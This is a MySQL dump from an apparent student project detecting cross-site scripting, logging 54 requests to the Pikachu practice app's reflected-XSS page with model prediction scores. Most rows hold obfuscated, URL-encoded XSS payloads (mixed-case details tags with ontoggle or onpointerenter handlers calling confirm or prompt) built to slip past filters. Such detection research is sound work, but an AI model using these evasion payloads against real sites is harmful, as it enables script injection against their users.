/*
 Navicat Premium Data Transfer

 Source Server         : localhost_3306
 Source Server Type    : MySQL
 Source Server Version : 50726
 Source Host           : localhost:3306
 Source Schema         : bishe2025

 Target Server Type    : MySQL
 Target Server Version : 50726
 File Encoding         : 65001

 Date: 14/04/2025 18:20:12
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for normal_data
-- ----------------------------
DROP TABLE IF EXISTS `normal_data`;
CREATE TABLE `normal_data`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `predict_host` varchar(20) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,
  `prediction` varchar(45) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,
  `src_ip` varchar(45) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,
  `dst_ip` varchar(45) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,
  `capture_time` datetime(0) NULL DEFAULT NULL,
  `url` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 55 CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of normal_data
-- ----------------------------
INSERT INTO `normal_data` VALUES (1, 'computer2', '0.041327942', '192.168.38.130', '192.168.38.1', '2025-04-14 16:50:27', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=d');
INSERT INTO `normal_data` VALUES (2, 'computer1', '0.041327942', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:24', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=d');
INSERT INTO `normal_data` VALUES (3, 'computer3', '0.056565233', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:24', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=v3dm0s');
INSERT INTO `normal_data` VALUES (4, 'computer1', '0.22458094', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:24', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3C3nd');
INSERT INTO `normal_data` VALUES (5, 'computer2', '0.0026178034', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:24', '/pikachu/vul/xss/xss_reflected_get.php?submit=v3dm0s&message=d');
INSERT INTO `normal_data` VALUES (6, 'computer1', '0.16377738', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:24', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3E3nd');
INSERT INTO `normal_data` VALUES (7, 'computer3', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:26', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDetAIls%250dONpOInterEnter%250d%3D%250d%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (8, 'computer3', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:26', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDEtAILs%250dONtoggle%250a%3D%250a%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (9, 'computer3', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:28', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTailS%250dOntogGLE%2B%3D%2B%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (10, 'computer1', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:29', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTAiLS%250dOnTOGGle%2509%3D%2509%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (11, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:30', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDeTaIlS%2509onpoinTeRentEr%250a%3D%250a%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (12, 'computer3', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:33', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDeTails%2509ONPOiNtEReNTER%250d%3D%250d%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (13, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:33', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTailS%250aOnpOinTerEnTer%2B%3D%2B%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (14, 'computer3', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:38', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAiLS%2509oNtogglE%250a%3D%250a%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (15, 'computer2', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:39', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDETAIls%2509ONpOiNTerEnTER%250d%3D%250d%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (16, 'computer1', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:40', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAILs%2509onTOGGLE%250d%3D%250d%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (17, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:42', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDETails%250aOnpOinTerEnteR%2509%3D%2509%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (18, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:46', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdETaIls%250doNPoInTEReNtEr%250a%3D%250a%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (19, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:47', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetaiLs%2509OnpoiNTereNTEr%2509%3D%2509%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (20, 'computer2', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:47', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAIls%250aoNToGGLe%2509%3D%2509%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (21, 'computer2', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:48', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTaIls%2509ONpoINtERenTER%250a%3D%250a%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (22, 'computer3', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:49', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetaIlS%2509ONPoiNTeRENtER%2B%3D%2B%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (23, 'computer2', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:48', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAilS%2509oNTogGLE%2509%3D%2509%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (24, 'computer3', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:49', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDETAilS%250aOntOGgLe%250a%3D%250a%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (25, 'computer3', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:49', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtAiLs%250aoNToggLe%2B%3D%2B%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (26, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:50', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtAiLs%250aoNPoIntErEntER%250d%3D%250d%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (27, 'computer2', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:49', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTaIlS%250dONtoGgle%2509%3D%2509%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (28, 'computer1', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:49', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtaIlS%250aONpOINTerEnTEr%2509%3D%2509%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (29, 'computer2', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:52', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDETAils%250aOntOGGle%250d%3D%250d%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (30, 'computer2', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:52', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTAILs%250dOnPOinteRENteR%2B%3D%2B%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (31, 'computer1', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:52', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetaiLs%2509OnTOGGLe%2B%3D%2B%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (32, 'computer2', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:57', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTaILs%250doNPOINtERenTER%250d%3D%250d%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (33, 'computer2', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:57', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDeTAILs%250aontOggLE%2509%3D%2509%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (34, 'computer3', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:57', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdETAILS%250dOnPoINTerenter%2509%3D%2509%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (35, 'computer1', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:54', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtaILS%250aonTOggLE%250a%3D%250a%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (36, 'computer1', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:55', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDeTAIls%2509onPOIntEREntER%2B%3D%2B%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (37, 'computer2', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:01:57', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtails%250aONpoINtErenTer%250d%3D%250d%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (38, 'computer3', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:04', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTAilS%250dOnTOGGLE%250d%3D%250d%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (39, 'computer3', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:04', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTaiLs%250aoNtoGGLe%250d%3D%250d%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (40, 'computer3', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:06', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDETaiLS%2509OnTOggle%250d%3D%250d%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (41, 'computer1', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:05', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtaIlS%250doNpOInteRenteR%2509%3D%2509%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (42, 'computer1', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:06', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetaiLS%250aonpoINTErEnTER%2B%3D%2B%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (43, 'computer2', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:10', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTAIls%250dONPOiNTerENTeR%2B%3D%2B%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (44, 'computer2', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:10', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdETaIlS%2509ONTogGlE%2B%3D%2B%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (45, 'computer2', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:13', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAiLs%250dontoGGLe%2B%3D%2B%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (46, 'computer3', '0.117828116', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:14', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTaILS%250aOnPoInteReNTer%250a%3D%250a%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (47, 'computer2', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:15', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdETaILS%250aOnPOiNtEreNTer%250a%3D%250a%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (48, 'computer2', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:16', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDeTaILS%250dONpOInTeRENTEr%250a%3D%250a%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (49, 'computer1', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:16', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTaiLS%2509ONTOggLe%2509%3D%2509%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (50, 'computer3', '0.2236647', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:19', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdeTailS%2509ONPoINTErENter%2509%3D%2509%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (51, 'computer3', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:19', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdEtaiLs%250aonTOGgLe%2B%3D%2B%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (52, 'computer1', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:19', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAiLs%250donTOgGLe%250d%3D%250d%5B8%5D.find%28confirm%29%2F%2F3nd');
INSERT INTO `normal_data` VALUES (53, 'computer2', '0.40532476', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:22', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CdetAILS%250doNtoggLE%250a%3D%250a%28prompt%29%60%60%2F%2F3nd');
INSERT INTO `normal_data` VALUES (54, 'computer1', '0.12588438', '192.168.38.130', '192.168.38.1', '2025-04-14 17:02:21', '/pikachu/vul/xss/xss_reflected_get.php?submit=submit&message=st4r7s%3CDEtaiLs%2509OnTOgGLE%250a%3D%250a%5B8%5D.find%28confirm%29%2F%2F3nd');

SET FOREIGN_KEY_CHECKS = 1;
